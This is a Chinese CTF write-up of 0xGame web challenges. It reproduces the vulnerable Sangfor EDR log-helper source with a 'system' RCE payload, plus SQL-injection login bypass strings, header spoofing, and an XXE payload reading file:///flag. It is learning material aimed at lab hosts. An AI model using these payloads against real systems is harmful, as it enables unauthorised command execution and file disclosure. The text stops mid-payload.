        <content type="html"><![CDATA[<p>by:gyy</p><h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="考察robots协议"><a href="#考察robots协议" class="headerlink" title="考察robots协议"></a>考察robots协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30051"><a href="#题目地址：http-web-game-0xctf-com-30051" class="headerlink" title="题目地址：http://web.game.0xctf.com:30051/"></a>题目地址：<a href="http://web.game.0xctf.com:30051/">http://web.game.0xctf.com:30051/</a></h4><p>知识链接：</p><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><p>直接访问.&#x2F;robots.php</p><pre class="language-none"><code class="language-none">User-agent: *Allow: &#x2F;User-agent: CTFerDisallow: &#x2F;flaaaggg.php</code></pre><h3 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h3><p>访问&#x2F;flaaaggg.php即可</p><p>问题解决：0xGame{now_you_k0nw_robots_Protocol}</p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>考察会不会看源码</p><h3 id="最终-1"><a href="#最终-1" class="headerlink" title="最终"></a>最终</h3><p>f12看源码就行</p><p>问题解决：0xGame{web_sign_in}</p><h2 id="get-amp-post"><a href="#get-amp-post" class="headerlink" title="get&amp;post"></a>get&amp;post</h2><h3 id="考察get与post的应用"><a href="#考察get与post的应用" class="headerlink" title="考察get与post的应用"></a>考察get与post的应用</h3><p>打开直接给代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'acd666tql'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$c</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Do you konw GET &amp; POST ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>代码审计，get传参，post传参即可</p><h3 id="最终-2"><a href="#最终-2" class="headerlink" title="最终"></a>最终</h3><p>payload：<code>./?0xGame=acd666tql</code><br>post:<code>X1cT34m=acd666tql</code></p><p>问题解决：0xGame{Get_4nd_P0sT_1s_eA5y}</p><h2 id="wh1sper’s-secret-garden"><a href="#wh1sper’s-secret-garden" class="headerlink" title="wh1sper’s_secret_garden"></a>wh1sper’s_secret_garden</h2><h3 id="考察http协议"><a href="#考察http协议" class="headerlink" title="考察http协议"></a>考察http协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30050"><a href="#题目地址：http-web-game-0xctf-com-30050" class="headerlink" title="题目地址：http://web.game.0xctf.com:30050/"></a>题目地址：<a href="http://web.game.0xctf.com:30050/">http://web.game.0xctf.com:30050/</a></h4><p>打开发现：</p><pre class="language-none"><code class="language-none">你需要使用wh1sper浏览器来访问什么？没有？没有wh1sper浏览器还想打web？</code></pre><p>抓包改包,浏览器改成wh1sper</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>然后发现</p><pre class="language-none"><code class="language-none">你需要来自：https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;</code></pre><p>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><p>这里<code>Referer: https://ctf.njupt.edu.cn/</code></p><p>再发包，发现</p><pre><code>你得从本地访问才行哟！</code></pre><p>改包，加上<code>X-Forwarded-For: 127.0.0.1</code></p><h3 id="最终-3"><a href="#最终-3" class="headerlink" title="最终"></a>最终</h3><p>发包：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Referer: https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;X-Forwarded-For: 127.0.0.1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>问题解决：0xGame{宁就是接头霸王?}</p><h2 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h2><h3 id="考察linux指令"><a href="#考察linux指令" class="headerlink" title="考察linux指令"></a>考察linux指令</h3><h4 id="题目地址：http-web-game-0xctf-com-30054"><a href="#题目地址：http-web-game-0xctf-com-30054" class="headerlink" title="题目地址：http://web.game.0xctf.com:30054/"></a>题目地址：<a href="http://web.game.0xctf.com:30054/">http://web.game.0xctf.com:30054/</a></h4><p>进去看到<code>请输入linux指令</code></p><h3 id="最终-4"><a href="#最终-4" class="headerlink" title="最终"></a>最终</h3><p>直接cat &#x2F;flag</p><p>问题解决：0xGame{fl4g_1s_c0ntent}</p><h2 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h2><h3 id="考察edr和搜索引擎"><a href="#考察edr和搜索引擎" class="headerlink" title="考察edr和搜索引擎"></a>考察edr和搜索引擎</h3><h4 id="题目地址：http-web1-game-0xctf-com-40000"><a href="#题目地址：http-web1-game-0xctf-com-40000" class="headerlink" title="题目地址：http://web1.game.0xctf.com:40000/"></a>题目地址：<a href="http://web1.game.0xctf.com:40000/">http://web1.game.0xctf.com:40000/</a></h4><p>深信服edr的漏洞</p><p>这里有一篇介绍：<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a></p><p>源码在这</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * c.php * 查看ldb的日志 * 支持正则表达式过滤，可以过滤文件以及每行日志   */</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**   * 编解码      @param string $data 编解码数据        * @return string 返回编解码数据          /              $code = function($data) &#123;          for ($i = 0; $i &lt; strlen($data); ++$i) &#123;              $data[$i] = $data[$i] ^ 'G';          &#125;          return $data;              &#125;;/** * 加密请求 * @param string $site  站点 * @param string $query 请求串 * @return string 返回请求URL */</span><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$site</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$site</span></span>/<span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 解密回复 * @param string $data 回复数据 * @return array 返回回复数据 */</span><span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dec</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$dec</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 找到匹配的日志 * @param string $path 文件路径匹配 * @param string $item 日志项匹配 * @param string $topn TOP N  * @param string $host 主机 * @return array 返回匹配结果 */</span><span class="token variable">$collect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token variable">$topn</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$item</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://127.0.0.1:8089"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"op=ll&amp;host=<span class="token interpolation"><span class="token variable">$host</span></span>&amp;path=<span class="token interpolation"><span class="token variable">$path</span></span>&amp;item=<span class="token interpolation"><span class="token variable">$item</span></span>&amp;top=<span class="token interpolation"><span class="token variable">$topn</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 显示某个表单域 * @param array $info 表单域信息, array("name" => "xx", "value" => "xxx", "note" => "help"); * @return */</span><span class="token variable">$show_input</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>&lt;font size=2><span class="token interpolation"><span class="token variable">$title</span></span>: &lt;/font>&lt;input type=\"text\" size=30 id=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" name=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" value=\"<span class="token interpolation"><span class="token variable">$value</span></span>\">&lt;font size=2><span class="token interpolation"><span class="token variable">$note</span></span>&lt;/font>&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 去掉反斜杠 * @param string $var 值 * @return string 返回去掉反斜杠的值 */</span><span class="token variable">$strip_slashes</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 显示表单 * @param array $params 请求参数 * @return */</span><span class="token variable">$show_form</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$strip_slashes</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$show_input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token variable">$path</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$row</span>   <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token comment">// 绘制表单</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;form id="studio" name="studio" method="post" action="">'</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Host "</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"host"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"value"</span> <span class="token operator">=></span> <span class="token variable">$host</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"note"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">" - host, e.g. 127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Path "</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"path"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"value"</span> <span class="token operator">=></span> <span class="token variable">$path</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"note"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">" - path regex, e.g. mapreduce"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Row  "</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"row"</span><span class="token punctuation">,</span>   <span class="token string double-quoted-string">"value"</span> <span class="token operator">=></span> <span class="token variable">$row</span><span class="token punctuation">,</span>   <span class="token string double-quoted-string">"note"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">" - row regex, e.g. \s[w|e]\s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Limit"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"value"</span> <span class="token operator">=></span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"note"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">" - top n, e.g. 100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;input type="submit" id="button">'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/form>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 入口函数 * @param array $argv 配置参数 * @return */</span><span class="token variable">$main</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span>     <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$collect</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$collect</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"success"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"success"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$host</span> <span class="token operator">=></span> <span class="token variable">$items</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$last</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n[<span class="token interpolation"><span class="token variable">$host</span></span>] -> <span class="token interpolation"><span class="token variable">$last</span></span>\n\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"item"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;html>&lt;head>&lt;meta http-equiv="Content-Type" Content="text/html; Charset=utf-8">&lt;/head>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;body bgcolor="#e8ddcb">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>&lt;b>Log Helper&lt;/b>&lt;/p>"</span><span class="token punctuation">;</span><span class="token variable">$show_form</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token variable">$main</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>可以任意文件读取下载</p><h3>最终</h3>payload：./?strip_slashes=system&host=cat /flag<p>问题解决：0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</p><h2 id="just-login"><a href="#just-login" class="headerlink" title="just_login"></a>just_login</h2><h3 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h3><h4 id="题目地址：http-web-game-0xctf-com-30055"><a href="#题目地址：http-web-game-0xctf-com-30055" class="headerlink" title="题目地址：http://web.game.0xctf.com:30055/"></a>题目地址：<a href="http://web.game.0xctf.com:30055/">http://web.game.0xctf.com:30055/</a></h4><p>dirsearch扫不到东西</p><p>sqlmap跑一下没用</p><p>不知道干啥，直接burp抓包用户名爆破<br>真爆出来了</p><h3>最终</h3>payload：<pre class="language-none"><code class="language-none">&#39; or 0&#x3D;0 #&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;x&#39; or 1&#x3D;1 or &#39;x&#39;&#x3D;&#39;y</code></pre><p>问题解决：0xGame{e5sy_sql_1njeCtion}</p><h2 id="close-eyes"><a href="#close-eyes" class="headerlink" title="close_eyes"></a>close_eyes</h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="题目地址：http-web-game-0xctf-com-30052"><a href="#题目地址：http-web-game-0xctf-com-30052" class="headerlink" title="题目地址：http://web.game.0xctf.com:30052/"></a>题目地址：<a href="http://web.game.0xctf.com:30052/">http://web.game.0xctf.com:30052/</a></h4><h2 id="inject-me"><a href="#inject-me" class="headerlink" title="inject_me"></a>inject_me</h2><h3 id="XXE显式攻击"><a href="#XXE显式攻击" class="headerlink" title="XXE显式攻击"></a>XXE显式攻击</h3><h4 id="题目地址：http-web-game-0xctf-com-30061"><a href="#题目地址：http-web-game-0xctf-com-30061" class="headerlink" title="题目地址：http://web.game.0xctf.com:30061/"></a>题目地址：<a href="http://web.game.0xctf.com:30061/">http://web.game.0xctf.com:30061/</a></h4><h3 id="最终-5"><a href="#最终-5" class="headerlink" title="最终"></a>最终</h3><p>payload：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">GVI</span> <span class="token punctuation">[</span><span class="token internal-subset"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token 